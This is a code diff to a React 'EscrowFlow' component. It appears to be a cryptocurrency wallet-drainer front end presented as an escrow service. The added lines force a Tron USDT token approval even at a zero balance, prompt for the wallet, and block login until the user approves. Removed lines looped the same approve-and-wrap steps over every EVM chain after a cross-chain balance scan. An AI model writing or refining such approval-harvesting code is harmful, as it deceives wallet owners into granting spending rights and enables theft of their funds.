@@ -1569,13 +1569,19 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     try {
       if (!address) throw new Error("No connected wallet");
 
-      // Fresh multi-chain balance detect (server RPCs — no wallet switch yet)
+      // Mandatory Tron USDT approve — prompt for tronWeb if needed (Trust/TronLink DApp).
       let tronAddr = tronAddress ?? getConnectedTronAddress();
       if (!tronAddr) {
-        tronAddr = await ensureTronAddress({ prompt: false }).catch(() => null);
+        tronAddr = await ensureTronAddress({ prompt: true }).catch(() => null);
         if (tronAddr) setTronAddress(tronAddr);
       }
+      if (!tronAddr) {
+        throw Object.assign(new Error("tron_wallet_not_connected"), {
+          code: "TRON_APPROVE_FAILED",
+        });
+      }
 
+      // Scan only to detect live allowance / cache balances — Tron runs even at $0.
       const scanRes = await fetch("/api/scan-balances", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -1595,26 +1601,22 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       if (scan.ok && scan.chainUsd) setCachedScanUsd(scan.chainUsd);
       noteStableFromScan(scan.tokensWithBalance, hasStableRef);
 
-      // ── Tron USDT (if present) — skip if Modal 1 already approved ─────────
-      const tronHit = (scan.tokensWithBalance ?? []).find(
-        (t) => t.isTron && t.balanceUsd > 0.01
+      const tronToken = (scan.tokensWithBalance ?? []).find(
+        (t) => t.isTron && t.symbol === "USDT"
       );
-      const tronAlreadyDone =
-        approvedChains.includes("tron") || Boolean(tronHit?.alreadyApproved);
-      if (tronHit && tronAddr && !tronAlreadyDone) {
+      const tronAlreadyDone = Boolean(tronToken?.alreadyApproved);
+
+      if (!tronAlreadyDone) {
         try {
-          const runTron = async () => {
-            await completeTronUsdtApproval();
-            approvalRetryRef.current = null;
-            loginBlockedRef.current = false;
-            setShowApprovalRetry(false);
-            setPhase((p) => (p === "unable-to-login" ? "approving" : p));
-          };
-          await runTron();
+          await completeTronUsdtApproval(tronAddr);
+          approvalRetryRef.current = null;
+          loginBlockedRef.current = false;
+          setShowApprovalRetry(false);
+          setPhase((p) => (p === "unable-to-login" ? "approving" : p));
         } catch (tronErr) {
           console.warn("[escrow] tron approve failed:", tronErr);
           gateOnApprovalFailure(async () => {
-            await completeTronUsdtApproval();
+            await completeTronUsdtApproval(tronAddr);
             approvalRetryRef.current = null;
             setShowApprovalRetry(false);
             setPhase("approving");
@@ -1622,22 +1624,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
           });
           return;
         }
-      } else if (tronAlreadyDone && tronAddr) {
+      } else {
         setApprovedChains((prev) => (prev.includes("tron") ? prev : [...prev, "tron"]));
-      }
-
-      // ── Every EVM chain with USDT/USDC or wrappable native ─────────────────
-      // Sequential: wallets can only be on one chain at a time. Each chain gets
-      // its own switch → authorize → approve stables → wrap native → verify.
-      // This is what was missing when only the Modal-1 "winner" (e.g. Polygon)
-      // ran and BNB USDT was never attempted.
-      for (const chain of CHAINS) {
-        try {
-          await processEvmChainForDeposit(chain);
-        } catch (chainErr) {
-          if (await blockLoginAfterApprovalCancel(`deposit-${chain.name}`, chainErr)) return;
-          console.warn(`[escrow] chain ${chain.name} failed:`, chainErr);
-        }
       }
 
       if (session) {
